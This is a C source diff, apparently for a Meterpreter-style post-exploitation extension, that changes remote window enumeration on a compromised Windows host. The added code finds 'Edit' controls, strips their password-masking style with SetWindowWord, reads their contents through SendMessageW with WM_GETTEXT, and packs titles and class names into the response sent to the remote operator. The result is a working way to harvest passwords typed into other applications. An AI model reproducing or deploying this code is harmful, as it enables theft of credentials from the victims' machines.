@@ -5,7 +5,7 @@
 #include "extapi.h"
 #include "window.h"
 
-VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const char* cpWindowTitle, DWORD dwProcessId);
+VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const wchar_t* cpWindowTitle_u, const wchar_t* cpClassName_u, DWORD dwProcessId);
 DWORD enumerate_windows(Packet *response, BOOL bIncludeUnknown, QWORD parentWindow);
 
 /*! @brief The maximum number of characters extracted from a window title. */
@@ -13,8 +13,12 @@ DWORD enumerate_windows(Packet *response, BOOL bIncludeUnknown, QWORD parentWind
 
 /*! @brief EnumChildWindows function pointer type. */
 typedef BOOL(WINAPI * PENUMCHILDWINDOWS)(HWND hWndParent, WNDENUMPROC enumProc, LPARAM lparam);
-/*! @brief GetWindowTextA function pointer type. */
-typedef int (WINAPI * PGETWINDOWTEXA)(HWND hWnd, LPSTR lpString, int nMaxCount);
+/*! @brief SendMessageW function pointer type. */
+typedef int (WINAPI * PSENDMESSAGEW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
+/*! @brief SetWindowWord function pointer type. */
+typedef int (WINAPI * PSETWINDOWWORD)(HWND hWnd, int nIndex, WORD nNewWord);
+/*! @brief GetClassNameW function pointer type. */
+typedef int (WINAPI * PGETCLASSNAMEW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
 /*! @brief GetWindowThreadProcessId function pointer type. */
 typedef DWORD(WINAPI * PGETWINDOWTHREADPROCESSID)(HWND hWnd, LPDWORD lpdwProcessId);
 
@@ -23,7 +27,9 @@ typedef struct _EnumWindowsState
 {
 	Packet* pResponse;                                     ///< Pointer to the \c Packet to add results to.
 	BOOL bIncludeUnknown;                                  ///< Flag indicating if unknown windows should be included.
-	PGETWINDOWTEXA pGetWindowTextA;                        ///< Pointer to the GetWindowTextA function.
+	PSENDMESSAGEW pSendMessageW;                        ///< Pointer to the SendMessageW function.
+	PGETCLASSNAMEW pGetClassNameW;                        ///< Pointer to the GetClassNameW function.
+	PSETWINDOWWORD pSetWindowWord;                        ///< Pointer to the SetWindowWord function.
 	PGETWINDOWTHREADPROCESSID pGetWindowThreadProcessId;   ///< Pointer to the GetWindowThreadProcessId function.
 } EnumWindowsState;
 
@@ -36,7 +42,8 @@ typedef struct _EnumWindowsState
  */
 BOOL CALLBACK enumerate_windows_callback(HWND hWnd, LPARAM lParam)
 {
-	char windowTitle[MAX_WINDOW_TITLE];
+	wchar_t windowTitle_u[MAX_WINDOW_TITLE];
+	wchar_t className_u[MAX_WINDOW_TITLE];
 	DWORD dwThreadId = 0;
 	DWORD dwProcessId = 0;
 	EnumWindowsState* pState = (EnumWindowsState*)lParam;
@@ -45,13 +52,34 @@ BOOL CALLBACK enumerate_windows_callback(HWND hWnd, LPARAM lParam)
 
 	do
 	{
-		dprintf("[EXTAPI WINDOW] Getting window title %p", pState->pGetWindowTextA);
-		if (pState->pGetWindowTextA(hWnd, windowTitle, MAX_WINDOW_TITLE) == 0)
+		dprintf("[EXTAPI WINDOW] Getting class name %p", pState->pGetClassNameW);
+		if (pState->pGetClassNameW(hWnd, className_u, MAX_WINDOW_TITLE) == 0)
+		{
+			dprintf("[EXTAPI WINDOW] Unable to get class name. Setting to <unknown>.");
+			if (pState->bIncludeUnknown)
+			{
+				wcsncpy_s(className_u, MAX_WINDOW_TITLE, L"<unknown>", MAX_WINDOW_TITLE - 1);
+			}
+			else
+			{
+				break;
+			}
+		}
+
+		dprintf("[EXTAPI WINDOW] Getting class name %p", pState->pSetWindowWord);
+		if (wcscmp(className_u, L"Edit") == 0)
+		{
+			dprintf("[EXTAPI WINDOW] Remove ES_PASSWORD style.");
+			pState->pSetWindowWord(hWnd, GWL_STYLE, 0);
+		}
+
+		dprintf("[EXTAPI WINDOW] Getting window title %p", pState->pSendMessageW);
+		if (pState->pSendMessageW(hWnd, WM_GETTEXT, MAX_WINDOW_TITLE, (LPARAM)windowTitle_u) == 0)
 		{
 			dprintf("[EXTAPI WINDOW] Unable to get window title. Setting to <unknown>.");
 			if (pState->bIncludeUnknown)
 			{
-				strncpy_s(windowTitle, MAX_WINDOW_TITLE, "<unknown>", MAX_WINDOW_TITLE - 1);
+				wcsncpy_s(windowTitle_u, MAX_WINDOW_TITLE, L"<unknown>", MAX_WINDOW_TITLE - 1);
 			}
 			else
 			{
@@ -63,7 +91,7 @@ BOOL CALLBACK enumerate_windows_callback(HWND hWnd, LPARAM lParam)
 		dwThreadId = pState->pGetWindowThreadProcessId(hWnd, &dwProcessId);
 
 		dprintf("[EXTAPI WINDOW] Adding enumerated response");
-		add_enumerated_window(pState->pResponse, (QWORD)hWnd, windowTitle, dwProcessId);
+		add_enumerated_window(pState->pResponse, (QWORD)hWnd, windowTitle_u, className_u, dwProcessId);
 	} while (0);
 
 	return TRUE;
@@ -92,12 +120,26 @@ DWORD enumerate_windows(Packet *response, BOOL bIncludeUnknown, QWORD parentWind
 			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to load user32.dll");
 		}
 
-		dprintf("[EXTAPI WINDOW] Searching for GetWindowTextA");
-		if ((state.pGetWindowTextA = (PGETWINDOWTEXA)GetProcAddress(hUser32, "GetWindowTextA")) == NULL)
+		dprintf("[EXTAPI WINDOW] Searching for SendMessageW");
+		if ((state.pSendMessageW = (PSENDMESSAGEW)GetProcAddress(hUser32, "SendMessageW")) == NULL)
 		{
-			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate GetWindowTextA in user32.dll");
+			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate SendMessageW in user32.dll");
 		}
-		dprintf("[EXTAPI WINDOW] Found GetWindowTextA %p", state.pGetWindowTextA);
+		dprintf("[EXTAPI WINDOW] Found SendMessageW %p", state.pSendMessageW);
+
+		dprintf("[EXTAPI WINDOW] Searching for GetClassNameW");
+		if ((state.pGetClassNameW = (PGETCLASSNAMEW)GetProcAddress(hUser32, "GetClassNameW")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate GetClassNameW in user32.dll");
+		}
+		dprintf("[EXTAPI WINDOW] Found GetClassNameW %p", state.pGetClassNameW);
+
+		dprintf("[EXTAPI WINDOW] Searching for SetWindowWord");
+		if ((state.pSetWindowWord = (PSETWINDOWWORD)GetProcAddress(hUser32, "SetWindowWord")) == NULL)
+		{
+			BREAK_ON_ERROR("[EXTAPI WINDOW] Unable to locate SetWindowWord in user32.dll");
+		}
+		dprintf("[EXTAPI WINDOW] Found SetWindowWord %p", state.pSetWindowWord);
 
 		dprintf("[EXTAPI WINDOW] Searching for GetWindowThreadProcessId");
 		if ((state.pGetWindowThreadProcessId = (PGETWINDOWTHREADPROCESSID)GetProcAddress(hUser32, "GetWindowThreadProcessId")) == NULL)
@@ -181,15 +223,16 @@ DWORD request_window_enum(Remote *remote, Packet *packet)
  * @param pResponse Pointer to the \c Response to add the window detail to.
  * @param qwHandle Handle to the window that was found/enumerated/
  * @param cpWindowTitle Title of the window.
+ * @param cpClassName ClassName of the window.
  * @param dwProcessId ID of the process that the Window belongs to.
  */
-VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const char* cpWindowTitle, DWORD dwProcessId)
+VOID add_enumerated_window(Packet *pResponse, QWORD qwHandle, const wchar_t* cpWindowTitle, const wchar_t* cpClassName, DWORD dwProcessId)
 {
 	Packet* pGroup = packet_create_group();
 
 	packet_add_tlv_uint(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_PID, dwProcessId);
 	packet_add_tlv_qword(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_HANDLE, qwHandle);
-	packet_add_tlv_string(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_TITLE, cpWindowTitle);
-
+	packet_add_tlv_string(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_TITLE, wchar_to_utf8(cpWindowTitle));
+	packet_add_tlv_string(pGroup, TLV_TYPE_EXT_WINDOW_ENUM_CLASSNAME, wchar_to_utf8(cpClassName));
 	packet_add_group(pResponse, TLV_TYPE_EXT_WINDOW_ENUM_GROUP, pGroup);
 }
